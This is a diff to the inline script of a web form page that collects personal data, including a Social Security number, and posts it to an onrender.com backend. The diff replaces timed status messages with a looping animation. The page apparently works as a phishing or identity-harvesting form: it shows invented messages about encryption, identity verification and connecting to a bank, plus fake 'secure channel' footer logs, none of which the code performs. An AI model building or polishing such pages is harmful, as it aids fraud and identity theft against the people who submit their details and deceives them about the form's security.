@@ -299,15 +299,10 @@ footer {
 </footer>
 
 <script>
-
-/* SUBMIT FLOW */
 const form = document.getElementById("form");
 
 form.addEventListener("submit", async function(e) {
   e.preventDefault();
-  e.stopImmediatePropagation();
-
-  console.log("Form submitted");
 
   const loadingBox = document.getElementById("loadingBox");
   const loadingText = document.getElementById("loadingText");
@@ -316,43 +311,58 @@ form.addEventListener("submit", async function(e) {
 
   const formData = new FormData(this);
 
-  setTimeout(() => {
-    loadingText.innerText = "🔐 Encrypting data...";
-  }, 1000);
+  /* 🔄 ANIMATION LOOP */
+  const steps = [
+    "🔐 Initializing secure session...",
+    "🔒 Encrypting data...",
+    "📊 Verifying identity...",
+    "🏦 Connecting to bank..."
+  ];
 
-  setTimeout(() => {
-    loadingText.innerText = "📊 Verifying identity...";
-  }, 2000);
+  let i = 0;
 
-  setTimeout(() => {
-    loadingText.innerText = "🏦 Connecting to bank...";
-  }, 3000);
+  const interval = setInterval(() => {
+    loadingText.innerText = steps[i];
+    i = (i + 1) % steps.length;
+  }, 1500);
 
   try {
-  const res = await fetch("https://form-s3i1.onrender.com/api/form/submit", {
-    method: "POST",
-    body: formData
-  });
+    const res = await fetch("https://form-s3i1.onrender.com/api/form/submit", {
+      method: "POST",
+      body: formData
+    });
 
-  if (!res.ok) {
-    throw new Error("Submission failed");
+    if (!res.ok) throw new Error("Failed");
+
+    const data = await res.json();
+
+    /* ✅ STOP ANIMATION */
+    clearInterval(interval);
+
+    loadingText.innerText = "✅ Submission Successful";
+
+    document.getElementById("successMessage").style.display = "block";
+
+    form.reset();
+
+    setTimeout(() => {
+      loadingBox.style.display = "none";
+    }, 1500);
+
+  } catch (err) {
+    console.error(err);
+
+    /* ❌ STOP ANIMATION */
+    clearInterval(interval);
+
+    loadingText.innerText = "❌ Error submitting form";
+
+    setTimeout(() => {
+      loadingBox.style.display = "none";
+    }, 2000);
   }
-
-  loadingText.innerText = "✅ Submission Successful";
-
-  document.getElementById("successMessage").style.display = "block";
-
-  form.reset();
-
-  setTimeout(() => {
-    loadingBox.style.display = "none";
-  }, 1000);
-
-} catch (err) {
-  loadingText.innerText = "❌ Error submitting form";
-  console.error(err);
-}
 });
+
 /* SSN VALIDATION */
 const ssnInput = document.getElementById("ssn");
 const ssnStatus = document.getElementById("ssnStatus");
@@ -375,21 +385,18 @@ ssnInput.addEventListener("input", () => {
 
 /* FOOTER LOGS */
 const logs = [
-"[SYSTEM] Secure channel established",
-"[AUTH] Verifying identity...",
-"[API] Connecting to bank...",
-"[SECURITY] Encryption active",
-"[STATUS] All systems operational"
+  "[SYSTEM] Secure channel established",
+  "[AUTH] Verifying identity...",
+  "[API] Connecting to bank...",
+  "[SECURITY] Encryption active",
+  "[STATUS] All systems operational"
 ];
 
-let i = 0;
+let j = 0;
 setInterval(() => {
-  document.getElementById("footerTrack").innerText = logs[i];
-  i = (i + 1) % logs.length;
+  document.getElementById("footerTrack").innerText = logs[j];
+  j = (j + 1) % logs.length;
 }, 3000);
-
-
-console.log("Script loaded");
 </script>
 
 </body>
